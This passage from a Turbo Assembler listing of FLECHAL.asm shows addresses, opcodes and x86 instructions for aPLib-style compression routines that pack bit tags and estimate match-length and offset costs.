1  2858	0000149C  59			 pop ecx
1  2859	0000149D  C3			 ret
1  2860
1  2861	0000149E			 aplib@094:
1  2862
1  2863	0000149E  C7 04	24 0000000F	 mov dword ptr [esp], 0000000Fh
1  2864	000014A5  EB C3			 jmp aplib@095	 ;   0.040113A
1  2865
1  2866	000014A7			 aplib@096:
1  2867
1  2868	000014A7  83 C7	07		 add edi, 00000007
1  2869	000014AA  EB E4			 jmp aplib@097	 ;   0.0401160
1  2870
1  2871	000014AC			 aplib@113:
1  2872
1  2873	000014AC  83 C7	02		 add edi, 00000002
1  2874	000014AF  EB DF			 jmp aplib@097
1  2875
1  2876	000014B1			 aplib@046:
1  2877
1  2878	000014B1  53			 push ebx
1  2879	000014B2  51			 push ecx
1  2880	000014B3  56			 push esi
1  2881	000014B4  57			 push edi
1  2882	000014B5  55			 push ebp
1  2883	000014B6  83 EC	08		 sub esp, 00000008
1  2884	000014B9  8B 0D	000AC1E0r	 mov ecx, dword	ptr [aplib@015]
1  2885	000014BF  8B 1D	000AC1D4r	 mov ebx, dword	ptr [aplib@004]
1  2886	000014C5  8B 35	000AC1DCr	 mov esi, dword	ptr [aplib@086]
1  2887	000014CB  8B E8			 mov ebp, eax
1  2888	000014CD  8B FA			 mov edi, edx
1  2889	000014CF  33 C0			 xor eax, eax
1  2890	000014D1  8A 45	00		 mov al, byte ptr [ebp+00]
1  2891	000014D4  85 C0			 test eax, eax
1  2892	000014D6  0F 85	000000BF	 jne aplib@098	 ;   0.040127E
1  2893	000014DC  49			 dec ecx
1  2894	000014DD  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  2895	000014E0  74 77			 je aplib@114	;   0.0401239
1  2896
1  2897	000014E2			 aplib@115:
1  2898
1  2899	000014E2  8A 16			 mov dl, byte ptr [esi]
1  2900	000014E4  02 D2			 add dl, dl
1  2901	000014E6  FE C2			 inc dl
1  2902	000014E8  49			 dec ecx
1  2903	000014E9  88 16			 mov byte ptr [esi], dl
1  2904	000014EB  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  2905	000014EE  74 76			 je aplib@116	;   0.0401246
1  2906
1  2907	000014F0			 aplib@117:
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 52
FLECHAL.asm



1  2908
1  2909	000014F0  8A 16			 mov dl, byte ptr [esi]
1  2910	000014F2  02 D2			 add dl, dl
1  2911	000014F4  FE C2			 inc dl
1  2912	000014F6  49			 dec ecx
1  2913	000014F7  88 16			 mov byte ptr [esi], dl
1  2914	000014F9  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  2915	000014FC  74 75			 je aplib@118	;   0.0401253
1  2916
1  2917	000014FE			 aplib@119:
1  2918
1  2919	000014FE  8A 16			 mov dl, byte ptr [esi]
1  2920	00001500  02 D2			 add dl, dl
1  2921	00001502  FE C2			 inc dl
1  2922	00001504  49			 dec ecx
1  2923	00001505  88 16			 mov byte ptr [esi], dl
1  2924	00001507  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  2925	0000150A  74 71			 je aplib@120	;   0.0401260
1  2926
1  2927	0000150C			 aplib@121:
1  2928
1  2929	0000150C  8A 16			 mov dl, byte ptr [esi]
1  2930	0000150E  02 D2			 add dl, dl
1  2931	00001510  49			 dec ecx
1  2932	00001511  88 16			 mov byte ptr [esi], dl
1  2933	00001513  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  2934	00001516  74 6F			 je aplib@122	;   0.040126A
1  2935
1  2936	00001518			 aplib@123:
1  2937
1  2938	00001518  8A 16			 mov dl, byte ptr [esi]
1  2939	0000151A  02 D2			 add dl, dl
1  2940	0000151C  49			 dec ecx
1  2941	0000151D  88 16			 mov byte ptr [esi], dl
1  2942	0000151F  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  2943	00001522  74 6D			 je aplib@124	;   0.0401274
1  2944
1  2945	00001524			 aplib@125:
1  2946
1  2947	00001524  8A 16			 mov dl, byte ptr [esi]
1  2948	00001526  02 D2			 add dl, dl
1  2949	00001528  49			 dec ecx
1  2950	00001529  88 16			 mov byte ptr [esi], dl
1  2951	0000152B  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  2952	0000152E  75 08			 jne aplib@126	 ;   0.0401218
1  2953	00001530  B9 00000007		 mov ecx, 00000007
1  2954	00001535  8B F3			 mov esi, ebx
1  2955	00001537  43			 inc ebx
1  2956
1  2957	00001538			 aplib@126:
1  2958
1  2959	00001538  8A 16			 mov dl, byte ptr [esi]
1  2960	0000153A  02 D2			 add dl, dl
1  2961
1  2962	0000153C			 aplib@127:
1  2963
1  2964	0000153C  88 16			 mov byte ptr [esi], dl
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 53
FLECHAL.asm



1  2965
1  2966	0000153E			 aplib@128:
1  2967
1  2968	0000153E  89 35	000AC1DCr	 mov dword ptr [aplib@086], esi
1  2969	00001544  89 1D	000AC1D4r	 mov dword ptr [aplib@004], ebx
1  2970	0000154A  89 0D	000AC1E0r	 mov dword ptr [aplib@015], ecx
1  2971	00001550  83 C4	08		 add esp, 00000008
1  2972
1  2973	00001553			 aplib@129:
1  2974
1  2975	00001553  5D			 pop ebp
1  2976	00001554  5F			 pop edi
1  2977	00001555  5E			 pop esi
1  2978	00001556  59			 pop ecx
1  2979	00001557  5B			 pop ebx
1  2980	00001558  C3			 ret
1  2981
1  2982	00001559			 aplib@114:
1  2983
1  2984	00001559  B9 00000007		 mov ecx, 00000007
1  2985	0000155E  8B F3			 mov esi, ebx
1  2986	00001560  43			 inc ebx
1  2987	00001561  E9 FFFFFF7C		 jmp aplib@115	 ;   0.04011B6
1  2988
1  2989	00001566			 aplib@116:
1  2990
1  2991	00001566  B9 00000007		 mov ecx, 00000007
1  2992	0000156B  8B F3			 mov esi, ebx
1  2993	0000156D  43			 inc ebx
1  2994	0000156E  E9 FFFFFF7D		 jmp aplib@117	 ;   0.04011C8
1  2995
1  2996	00001573			 aplib@118:
1  2997
1  2998	00001573  B9 00000007		 mov ecx, 00000007
1  2999	00001578  8B F3			 mov esi, ebx
1  3000	0000157A  43			 inc ebx
1  3001	0000157B  EB 81			 jmp aplib@119	 ;   0.04011DA
1  3002
1  3003	0000157D			 aplib@120:
1  3004
1  3005	0000157D  B9 00000007		 mov ecx, 00000007
1  3006	00001582  8B F3			 mov esi, ebx
1  3007	00001584  43			 inc ebx
1  3008	00001585  EB 85			 jmp aplib@121	 ;   0.04011EC
1  3009
1  3010	00001587			 aplib@122:
1  3011
1  3012	00001587  B9 00000007		 mov ecx, 00000007
1  3013	0000158C  8B F3			 mov esi, ebx
1  3014	0000158E  43			 inc ebx
1  3015	0000158F  EB 87			 jmp aplib@123	 ;   0.04011F8
1  3016
1  3017	00001591			 aplib@124:
1  3018
1  3019	00001591  B9 00000007		 mov ecx, 00000007
1  3020	00001596  8B F3			 mov esi, ebx
1  3021	00001598  43			 inc ebx
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 54
FLECHAL.asm



1  3022	00001599  EB 89			 jmp aplib@125	 ;   0.0401204
1  3023
1  3024	0000159B			 aplib@098:
1  3025
1  3026	0000159B  83 FA	0F		 cmp edx, 0000000Fh
1  3027	0000159E  0F 87	000000E0	 ja aplib@099	;   0.0401367
1  3028
1  3029	000015A4			 aplib@100:
1  3030
1  3031	000015A4  8B C7			 mov eax, edi
1  3032	000015A6  F7 D8			 neg eax
1  3033	000015A8  89 6C	24 04		 mov dword ptr [esp+04], ebp
1  3034	000015AC  03 C5			 add eax, ebp
1  3035
1  3036	000015AE			 aplib@101:
1  3037
1  3038	000015AE  8A 55	00		 mov dl, byte ptr [ebp+00]
1  3039	000015B1  3A 10			 cmp dl, byte ptr [eax]
1  3040	000015B3  74 0A			 je aplib@102	;   0.04012A2
1  3041	000015B5  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  3042	000015B9  40			 inc eax
1  3043	000015BA  4F			 dec edi
1  3044	000015BB  3B C2			 cmp eax, edx
1  3045	000015BD  75 EF			 jne aplib@101	 ;   0.0401291
1  3046
1  3047	000015BF			 aplib@102:
1  3048
1  3049	000015BF  8D 43	01		 lea eax, dword	ptr [ebx+01]
1  3050	000015C2  89 04	24		 mov dword ptr [esp], eax
1  3051	000015C5  8D 41	FF		 lea eax, dword	ptr [ecx-01]
1  3052	000015C8  85 FF			 test edi, edi
1  3053	000015CA  0F 84	00000136	 je aplib@103	;   0.04013E9
1  3054	000015D0  8B C8			 mov ecx, eax
1  3055	000015D2  83 F8	FF		 cmp eax, 0FFFFFFFFh
1  3056	000015D5  0F 84	000000B3	 je aplib@130
1  3057
1  3058	000015DB			 aplib@140:
1  3059
1  3060	000015DB  8A 16			 mov dl, byte ptr [esi]
1  3061	000015DD  02 D2			 add dl, dl
1  3062	000015DF  FE C2			 inc dl
1  3063	000015E1  49			 dec ecx
1  3064	000015E2  88 16			 mov byte ptr [esi], dl
1  3065	000015E4  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3066	000015E7  0F 84	000000B0	 je aplib@131
1  3067
1  3068	000015ED			 aplib@141:
1  3069
1  3070	000015ED  8A 16			 mov dl, byte ptr [esi]
1  3071	000015EF  02 D2			 add dl, dl
1  3072	000015F1  FE C2			 inc dl
1  3073	000015F3  49			 dec ecx
1  3074	000015F4  88 16			 mov byte ptr [esi], dl
1  3075	000015F6  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3076	000015F9  0F 84	000000AB	 je aplib@132
1  3077
1  3078	000015FF			 aplib@142:
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 55
FLECHAL.asm



1  3079
1  3080	000015FF  8A 16			 mov dl, byte ptr [esi]
1  3081	00001601  8B C7			 mov eax, edi
1  3082	00001603  02 D2			 add dl, dl
1  3083	00001605  49			 dec ecx
1  3084	00001606  FE C2			 inc dl
1  3085	00001608  83 E0	08		 and eax, 00000008
1  3086	0000160B  88 16			 mov byte ptr [esi], dl
1  3087	0000160D  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3088	00001610  0F 84	000000A1	 je aplib@133
1  3089
1  3090	00001616			 aplib@143:
1  3091
1  3092	00001616  85 C0			 test eax, eax
1  3093	00001618  0F 84	000000A6	 je aplib@134
1  3094	0000161E  8A 16			 mov dl, byte ptr [esi]
1  3095	00001620  02 D2			 add dl, dl
1  3096	00001622  FE C2			 inc dl
1  3097
1  3098	00001624			 aplib@144:
1  3099
1  3100	00001624  88 16			 mov byte ptr [esi], dl
1  3101	00001626  8B C7			 mov eax, edi
1  3102	00001628  49			 dec ecx
1  3103	00001629  83 E0	04		 and eax, 00000004
1  3104	0000162C  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3105	0000162F  0F 84	00000098	 je aplib@135
1  3106
1  3107	00001635			 aplib@145:
1  3108
1  3109	00001635  85 C0			 test eax, eax
1  3110	00001637  0F 84	0000009D	 je aplib@136
1  3111	0000163D  8A 16			 mov dl, byte ptr [esi]
1  3112	0000163F  02 D2			 add dl, dl
1  3113	00001641  FE C2			 inc dl
1  3114
1  3115	00001643			 aplib@146:
1  3116
1  3117	00001643  88 16			 mov byte ptr [esi], dl
1  3118	00001645  8B C7			 mov eax, edi
1  3119	00001647  49			 dec ecx
1  3120	00001648  83 E0	02		 and eax, 00000002
1  3121	0000164B  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3122	0000164E  0F 84	0000008F	 je aplib@137
1  3123
1  3124	00001654			 aplib@147:
1  3125
1  3126	00001654  85 C0			 test eax, eax
1  3127	00001656  0F 84	00000094	 je aplib@138
1  3128	0000165C  8A 16			 mov dl, byte ptr [esi]
1  3129	0000165E  02 D2			 add dl, dl
1  3130	00001660  FE C2			 inc dl
1  3131
1  3132	00001662			 aplib@148:
1  3133
1  3134	00001662  88 16			 mov byte ptr [esi], dl
1  3135	00001664  49			 dec ecx
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 56
FLECHAL.asm



1  3136	00001665  83 E7	01		 and edi, 00000001
1  3137	00001668  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3138	0000166B  0F 84	00000088	 je aplib@139
1  3139
1  3140	00001671			 aplib@149:
1  3141
1  3142	00001671  85 FF			 test edi, edi
1  3143	00001673  0F 84	FFFFFEBF	 je aplib@126	;   0.0401218
1  3144	00001679  8A 16			 mov dl, byte ptr [esi]
1  3145	0000167B  02 D2			 add dl, dl
1  3146	0000167D  FE C2			 inc dl
1  3147	0000167F  E9 FFFFFEB8		 jmp aplib@127
1  3148
1  3149	00001684			 aplib@099:
1  3150
1  3151	00001684  BF 0000000F		 mov edi, 0000000Fh
1  3152	00001689  E9 FFFFFF16		 jmp aplib@100	 ;   0.0401287
1  3153
1  3154	0000168E			 aplib@130:
1  3155
1  3156	0000168E  B9 00000007		 mov ecx, 00000007
1  3157	00001693  8B F3			 mov esi, ebx
1  3158	00001695  8B 1C	24		 mov ebx, dword	ptr [esp]
1  3159	00001698  E9 FFFFFF3E		 jmp aplib@140
1  3160
1  3161	0000169D			 aplib@131:
1  3162
1  3163	0000169D  B9 00000007		 mov ecx, 00000007
1  3164	000016A2  8B F3			 mov esi, ebx
1  3165	000016A4  43			 inc ebx
1  3166	000016A5  E9 FFFFFF43		 jmp aplib@141
1  3167
1  3168	000016AA			 aplib@132:
1  3169
1  3170	000016AA  B9 00000007		 mov ecx, 00000007
1  3171	000016AF  8B F3			 mov esi, ebx
1  3172	000016B1  43			 inc ebx
1  3173	000016B2  E9 FFFFFF48		 jmp aplib@142
1  3174
1  3175	000016B7			 aplib@133:
1  3176
1  3177	000016B7  B9 00000007		 mov ecx, 00000007
1  3178	000016BC  8B F3			 mov esi, ebx
1  3179	000016BE  43			 inc ebx
1  3180	000016BF  E9 FFFFFF52		 jmp aplib@143
1  3181
1  3182	000016C4			 aplib@134:
1  3183
1  3184	000016C4  8A 16			 mov dl, byte ptr [esi]
1  3185	000016C6  02 D2			 add dl, dl
1  3186	000016C8  E9 FFFFFF57		 jmp aplib@144
1  3187
1  3188	000016CD			 aplib@135:
1  3189
1  3190	000016CD  B9 00000007		 mov ecx, 00000007
1  3191	000016D2  8B F3			 mov esi, ebx
1  3192	000016D4  43			 inc ebx
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 57
FLECHAL.asm



1  3193	000016D5  E9 FFFFFF5B		 jmp aplib@145
1  3194
1  3195	000016DA			 aplib@136:
1  3196
1  3197	000016DA  8A 16			 mov dl, byte ptr [esi]
1  3198	000016DC  02 D2			 add dl, dl
1  3199	000016DE  E9 FFFFFF60		 jmp aplib@146
1  3200
1  3201	000016E3			 aplib@137:
1  3202
1  3203	000016E3  B9 00000007		 mov ecx, 00000007
1  3204	000016E8  8B F3			 mov esi, ebx
1  3205	000016EA  43			 inc ebx
1  3206	000016EB  E9 FFFFFF64		 jmp aplib@147
1  3207
1  3208	000016F0			 aplib@138:
1  3209
1  3210	000016F0  8A 16			 mov dl, byte ptr [esi]
1  3211	000016F2  02 D2			 add dl, dl
1  3212	000016F4  E9 FFFFFF69		 jmp aplib@148
1  3213
1  3214	000016F9			 aplib@139:
1  3215
1  3216	000016F9  B9 00000007		 mov ecx, 00000007
1  3217	000016FE  8B F3			 mov esi, ebx
1  3218	00001700  43			 inc ebx
1  3219	00001701  E9 FFFFFF6B		 jmp aplib@149
1  3220
1  3221	00001706			 aplib@103:
1  3222
1  3223	00001706  8B C8			 mov ecx, eax
1  3224	00001708  83 F8	FF		 cmp eax, 0FFFFFFFFh
1  3225	0000170B  75 0A			 jne aplib@104	 ;   0.04013FA
1  3226	0000170D  B9 00000007		 mov ecx, 00000007
1  3227	00001712  8B F3			 mov esi, ebx
1  3228	00001714  8B 1C	24		 mov ebx, dword	ptr [esp]
1  3229
1  3230	00001717			 aplib@104:
1  3231
1  3232	00001717  8A 16			 mov dl, byte ptr [esi]
1  3233	00001719  02 D2			 add dl, dl
1  3234	0000171B  88 16			 mov byte ptr [esi], dl
1  3235	0000171D  8A 45	00		 mov al, byte ptr [ebp+00]
1  3236	00001720  88 03			 mov byte ptr [ebx], al
1  3237	00001722  43			 inc ebx
1  3238	00001723  E9 FFFFFE16		 jmp aplib@128
1  3239
1  3240	00001728			 aplib@025:
1  3241
1  3242	00001728  51			 push ecx
1  3243	00001729  8B C8			 mov ecx, eax
1  3244	0000172B  3D 00000080		 cmp eax, 00000080h
1  3245	00001730  73 1F			 jnb aplib@106	 ;   0.0401434
1  3246	00001732  83 FA	04		 cmp edx, 00000004
1  3247	00001735  73 1A			 jnb aplib@106
1  3248	00001737  3B 05	000AC1E8r	 cmp eax, dword	ptr [aplib@016]
1  3249	0000173D  74 12			 je aplib@106
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 58
FLECHAL.asm



1  3250	0000173F  85 C0			 test eax, eax
1  3251	00001741  75 07			 jne aplib@105	 ;   0.040142D
1  3252	00001743  B8 00000005		 mov eax, 00000005
1  3253	00001748  59			 pop ecx
1  3254	00001749  C3			 ret
1  3255
1  3256	0000174A			 aplib@105:
1  3257
1  3258	0000174A  B8 0000000B		 mov eax, 0000000Bh
1  3259	0000174F  59			 pop ecx
1  3260	00001750  C3			 ret
1  3261
1  3262	00001751			 aplib@106:
1  3263
1  3264	00001751  56			 push esi
1  3265	00001752  53			 push ebx
1  3266	00001753  8B 35	000AC1E8r	 mov esi, dword	ptr [aplib@016]
1  3267	00001759  BB 00000004		 mov ebx, 00000004
1  3268	0000175E  3B CE			 cmp ecx, esi
1  3269	00001760  74 26			 je aplib@107
1  3270	00001762  8B C1			 mov eax, ecx
1  3271	00001764  C1 E8	08		 shr eax, 08
1  3272	00001767  83 C0	03		 add eax, 00000003
1  3273	0000176A  83 F8	02		 cmp eax, 00000002
1  3274	0000176D  7D 2D			 jge aplib@150
1  3275	0000176F  B8 00000064		 mov eax, 00000064h
1  3276
1  3277	00001774			 aplib@151:
1  3278
1  3279	00001774  83 C0	06		 add eax, 00000006
1  3280	00001777  03 D8			 add ebx, eax
1  3281	00001779  81 F9	00000080	 cmp ecx, 00000080h
1  3282	0000177F  0F 83	000000FD	 jnb aplib@152	 ;   0.0401565
1  3283	00001785  83 EA	02		 sub edx, 00000002
1  3284
1  3285	00001788			 aplib@107:
1  3286
1  3287	00001788  83 FA	02		 cmp edx, 00000002
1  3288	0000178B  0F 8D	0000010C	 jnl aplib@109	 ;   0.0401580
1  3289	00001791  B8 00000064		 mov eax, 00000064h
1  3290
1  3291	00001796			 aplib@108:
1  3292
1  3293	00001796  03 C3			 add eax, ebx
1  3294	00001798  5B			 pop ebx
1  3295	00001799  5E			 pop esi
1  3296	0000179A  59			 pop ecx
1  3297	0000179B  C3			 ret
1  3298
1  3299	0000179C			 aplib@150:
1  3300
1  3301	0000179C  3B C3			 cmp eax, ebx
1  3302	0000179E  7D 07			 jge aplib@168
1  3303	000017A0  B8 00000002		 mov eax, 00000002
1  3304	000017A5  EB CD			 jmp aplib@151
1  3305
1  3306	000017A7			 aplib@168:
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 59
FLECHAL.asm



1  3307
1  3308	000017A7  83 F8	08		 cmp eax, 00000008
1  3309	000017AA  7D 04			 jge aplib@167
1  3310	000017AC  8B C3			 mov eax, ebx
1  3311	000017AE  EB C4			 jmp aplib@151
1  3312
1  3313	000017B0			 aplib@167:
1  3314
1  3315	000017B0  83 F8	10		 cmp eax, 00000010h
1  3316	000017B3  7D 07			 jge aplib@166
1  3317	000017B5  B8 00000006		 mov eax, 00000006h
1  3318	000017BA  EB B8			 jmp aplib@151
1  3319
1  3320	000017BC			 aplib@166:
1  3321
1  3322	000017BC  83 F8	20		 cmp eax, 00000020h
1  3323	000017BF  7D 07			 jge aplib@165
1  3324	000017C1  B8 00000008		 mov eax, 00000008
1  3325	000017C6  EB AC			 jmp aplib@151
1  3326
1  3327	000017C8			 aplib@165:
1  3328
1  3329	000017C8  83 F8	40		 cmp eax, 00000040h
1  3330	000017CB  7D 07			 jge aplib@164
1  3331	000017CD  B8 0000000A		 mov eax, 0000000Ah
1  3332	000017D2  EB A0			 jmp aplib@151
1  3333
1  3334	000017D4			 aplib@164:
1  3335
1  3336	000017D4  3D 00000080		 cmp eax, 00000080h
1  3337	000017D9  7D 07			 jge aplib@163
1  3338	000017DB  B8 0000000C		 mov eax, 0000000Ch
1  3339	000017E0  EB 92			 jmp aplib@151
1  3340
1  3341	000017E2			 aplib@163:
1  3342
1  3343	000017E2  3D 00000100		 cmp eax, 00000100h
1  3344	000017E7  7D 07			 jge aplib@162
1  3345	000017E9  B8 0000000E		 mov eax, 0000000Eh
1  3346	000017EE  EB 84			 jmp aplib@151
1  3347
1  3348	000017F0			 aplib@162:
1  3349
1  3350	000017F0  3D 00000200		 cmp eax, 00000200h
1  3351	000017F5  7D 0A			 jge aplib@161
1  3352	000017F7  B8 00000010		 mov eax, 00000010h
1  3353	000017FC  E9 FFFFFF73		 jmp aplib@151
1  3354
1  3355	00001801			 aplib@161:
1  3356
1  3357	00001801  3D 00000400		 cmp eax, 00000400h
1  3358	00001806  7D 0A			 jge aplib@160
1  3359	00001808  B8 00000012		 mov eax, 00000012h
1  3360	0000180D  E9 FFFFFF62		 jmp aplib@151
1  3361
1  3362	00001812			 aplib@160:
1  3363
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 60
FLECHAL.asm



1  3364	00001812  3D 00000800		 cmp eax, 00000800h
1  3365	00001817  7D 0A			 jge aplib@159
1  3366	00001819  B8 00000014		 mov eax, 00000014h
1  3367	0000181E  E9 FFFFFF51		 jmp aplib@151
1  3368
1  3369	00001823			 aplib@159:
1  3370
1  3371	00001823  3D 00001000		 cmp eax, 00001000h
1  3372	00001828  7D 0A			 jge aplib@158
1  3373	0000182A  B8 00000016		 mov eax, 00000016h
1  3374	0000182F  E9 FFFFFF40		 jmp aplib@151
1  3375
1  3376	00001834			 aplib@158:
1  3377
1  3378	00001834  3D 00002000		 cmp eax, 00002000h
1  3379	00001839  7D 0A			 jge aplib@157
1  3380	0000183B  B8 00000018		 mov eax, 00000018h
1  3381	00001840  E9 FFFFFF2F		 jmp aplib@151
1  3382
1  3383	00001845			 aplib@157:
1  3384
1  3385	00001845  3D 00004000		 cmp eax, 00004000h
1  3386	0000184A  7D 0A			 jge aplib@156
1  3387	0000184C  B8 0000001A		 mov eax, 0000001Ah
1  3388	00001851  E9 FFFFFF1E		 jmp aplib@151
1  3389
1  3390	00001856			 aplib@156:
1  3391
1  3392	00001856  3D 00008000		 cmp eax, 00008000h
1  3393	0000185B  7D 0A			 jge aplib@155
1  3394	0000185D  B8 0000001C		 mov eax, 0000001Ch
1  3395	00001862  E9 FFFFFF0D		 jmp aplib@151
1  3396
1  3397	00001867			 aplib@155:
1  3398
1  3399	00001867  3D 00010000		 cmp eax, 00010000h
1  3400	0000186C  7D 0A			 jge aplib@154
1  3401	0000186E  B8 0000001E		 mov eax, 0000001Eh
1  3402	00001873  E9 FFFFFEFC		 jmp aplib@151
1  3403
1  3404	00001878			 aplib@154:
1  3405
1  3406	00001878  B8 00000020		 mov eax, 00000020h
1  3407	0000187D  E9 FFFFFEF2		 jmp aplib@151
1  3408
1  3409	00001882			 aplib@152:
1  3410
1  3411	00001882  81 F9	00000500	 cmp ecx, 00000500h
1  3412	00001888  72 01			 jb aplib@153	;   0.040156E
1  3413	0000188A  4A			 dec edx
1  3414
1  3415	0000188B			 aplib@153:
1  3416
1  3417	0000188B  81 F9	00007D00	 cmp ecx, 00007D00h
1  3418	00001891  0F 82	FFFFFEF1	 jb aplib@107
1  3419	00001897  4A			 dec edx
1  3420	00001898  E9 FFFFFEEB		 jmp aplib@107
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 61
FLECHAL.asm



1  3421
1  3422	0000189D			 aplib@109:
1  3423
1  3424	0000189D  83 FA	04		 cmp edx, 00000004
1  3425	000018A0  7D 0A			 jge aplib@110	 ;   0.040158F
1  3426	000018A2  B8 00000002		 mov eax, 00000002
1  3427	000018A7  E9 FFFFFEEA		 jmp aplib@108
1  3428
1  3429	000018AC			 aplib@110:
1  3430
1  3431	000018AC  83 FA	08		 cmp edx, 00000008
1  3432	000018AF  7D 0A			 jge aplib@169
1  3433	000018B1  B8 00000004		 mov eax, 00000004
1  3434	000018B6  E9 FFFFFEDB		 jmp aplib@108
1  3435
1  3436	000018BB			 aplib@169:
1  3437
1  3438	000018BB  83 FA	10		 cmp edx, 00000010h
1  3439	000018BE  7D 0A			 jge aplib@170
1  3440	000018C0  B8 00000006		 mov eax, 00000006
1  3441	000018C5  E9 FFFFFECC		 jmp aplib@108
1  3442
1  3443	000018CA			 aplib@170:
1  3444
1  3445	000018CA  83 FA	20		 cmp edx, 00000020h
1  3446	000018CD  7D 0A			 jge aplib@171
1  3447	000018CF  B8 00000008		 mov eax, 00000008
1  3448	000018D4  E9 FFFFFEBD		 jmp aplib@108
1  3449
1  3450	000018D9			 aplib@171:
1  3451
1  3452	000018D9  83 FA	40		 cmp edx, 00000040h
1  3453	000018DC  7D 0A			 jge aplib@172
1  3454	000018DE  B8 0000000A		 mov eax, 0000000Ah
1  3455	000018E3  E9 FFFFFEAE		 jmp aplib@108
1  3456
1  3457	000018E8			 aplib@172:
1  3458
1  3459	000018E8  81 FA	00000080	 cmp edx, 00000080h
1  3460	000018EE  7D 0A			 jge aplib@173
1  3461	000018F0  B8 0000000C		 mov eax, 0000000Ch
1  3462	000018F5  E9 FFFFFE9C		 jmp aplib@108
1  3463
1  3464	000018FA			 aplib@173:
1  3465
1  3466	000018FA  81 FA	00000100	 cmp edx, 00000100h
1  3467	00001900  7D 0A			 jge aplib@174
1  3468	00001902  B8 0000000E		 mov eax, 0000000Eh
1  3469	00001907  E9 FFFFFE8A		 jmp aplib@108
1  3470
1  3471	0000190C			 aplib@174:
1  3472
1  3473	0000190C  81 FA	00000200	 cmp edx, 00000200h
1  3474	00001912  7D 0A			 jge aplib@175
1  3475	00001914  B8 00000010		 mov eax, 00000010h
1  3476	00001919  E9 FFFFFE78		 jmp aplib@108
1  3477
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 62
FLECHAL.asm



1  3478	0000191E			 aplib@175:
1  3479
1  3480	0000191E  81 FA	00000400	 cmp edx, 00000400h
1  3481	00001924  7D 0A			 jge aplib@176
1  3482	00001926  B8 00000012		 mov eax, 00000012h
1  3483	0000192B  E9 FFFFFE66		 jmp aplib@108
1  3484
1  3485	00001930			 aplib@176:
1  3486
1  3487	00001930  81 FA	00000800	 cmp edx, 00000800h
1  3488	00001936  7D 0A			 jge aplib@177
1  3489	00001938  B8 00000014		 mov eax, 00000014h
1  3490	0000193D  E9 FFFFFE54		 jmp aplib@108
1  3491
1  3492	00001942			 aplib@177:
1  3493
1  3494	00001942  81 FA	00001000	 cmp edx, 00001000h
1  3495	00001948  7D 0A			 jge aplib@178
1  3496	0000194A  B8 00000016		 mov eax, 00000016h
1  3497	0000194F  E9 FFFFFE42		 jmp aplib@108
1  3498
1  3499	00001954			 aplib@178:
1  3500
1  3501	00001954  81 FA	00002000	 cmp edx, 00002000h
1  3502	0000195A  7D 0A			 jge aplib@179
1  3503	0000195C  B8 00000018		 mov eax, 00000018h
1  3504	00001961  E9 FFFFFE30		 jmp aplib@108
1  3505
1  3506	00001966			 aplib@179:
1  3507
1  3508	00001966  81 FA	00004000	 cmp edx, 00004000h
1  3509	0000196C  7D 0A			 jge aplib@180
1  3510	0000196E  B8 0000001A		 mov eax, 0000001Ah
1  3511	00001973  E9 FFFFFE1E		 jmp aplib@108
1  3512
1  3513	00001978			 aplib@180:
1  3514
1  3515	00001978  81 FA	00008000	 cmp edx, 00008000h
1  3516	0000197E  7D 0A			 jge aplib@181
1  3517	00001980  B8 0000001C		 mov eax, 0000001Ch
1  3518	00001985  E9 FFFFFE0C		 jmp aplib@108
1  3519
1  3520	0000198A			 aplib@181:
1  3521
1  3522	0000198A  81 FA	00010000	 cmp edx, 00010000h
1  3523	00001990  7D 0A			 jge aplib@182
1  3524	00001992  B8 0000001E		 mov eax, 0000001Eh
1  3525	00001997  E9 FFFFFDFA		 jmp aplib@108
1  3526
1  3527	0000199C			 aplib@182:
1  3528
1  3529	0000199C  B8 00000020		 mov eax, 00000020h
1  3530	000019A1  E9 FFFFFDF0		 jmp aplib@108
1  3531
1  3532	000019A6			 aplib@058:
1  3533
1  3534	000019A6  53			 push ebx
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 63
FLECHAL.asm



1  3535	000019A7  51			 push ecx
1  3536	000019A8  56			 push esi
1  3537	000019A9  57			 push edi
1  3538	000019AA  55			 push ebp
1  3539	000019AB  83 EC	10		 sub esp, 00000010h
1  3540	000019AE  8B 0D	000AC1E0r	 mov ecx, dword	ptr [aplib@015]
1  3541	000019B4  8B 1D	000AC1D4r	 mov ebx, dword	ptr [aplib@004]
1  3542	000019BA  8B 35	000AC1DCr	 mov esi, dword	ptr [aplib@086]
1  3543	000019C0  89 44	24 0C		 mov dword ptr [esp+0Ch], eax
1  3544	000019C4  89 54	24 08		 mov dword ptr [esp+08], edx
1  3545	000019C8  3D 00000080		 cmp eax, 00000080h
1  3546	000019CD  0F 83	00000091	 jnb aplib@183
1  3547	000019D3  83 FA	04		 cmp edx, 00000004
1  3548	000019D6  0F 83	00000088	 jnb aplib@183
1  3549	000019DC  3B 05	000AC1E8r	 cmp eax, dword	ptr [aplib@016]
1  3550	000019E2  0F 84	0000007C	 je aplib@183
1  3551	000019E8  49			 dec ecx
1  3552	000019E9  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  3553	000019EC  74 62			 je aplib@184
1  3554
1  3555	000019EE			 aplib@185:
1  3556
